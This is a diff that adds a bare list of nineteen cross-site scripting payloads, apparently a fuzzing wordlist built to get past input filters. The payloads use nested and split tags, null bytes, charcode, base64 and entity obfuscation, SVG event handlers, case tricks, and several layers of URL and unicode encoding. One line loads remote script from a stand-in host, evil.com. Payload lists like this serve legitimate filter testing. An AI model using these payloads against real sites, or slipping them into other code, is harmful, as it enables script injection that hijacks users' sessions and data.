@@ -1,0 +1,19 @@
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<scr%00ipt>alert(1)</scr%00ipt>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
+<svg><animatetransform onbegin=alert(1)>
+<svg><set attributeName=onbegin value=alert(1)>
+<img src=1 onerror=alert(1) //
+<SCRIPT>alert(1)</SCRIPT>
+<sCrIpT>alert(1)</sCrIpT>
+<ScRiPt>alert(1)</ScRiPt>
+<script src=data:text/javascript,alert(1)></script>
+<script src=//evil.com/xss.js></script>
+%3Cscript%3Ealert(1)%3C/script%3E
+%253Cscript%253Ealert(1)%253C%252Fscript%253E
+\u003Cscript\u003Ealert(1)\u003C/script\u003E
+<script>onerror=alert;throw 1</script>
+<script>{onerror=alert}throw 1</script>
+<script>throw onerror=alert,1</script>
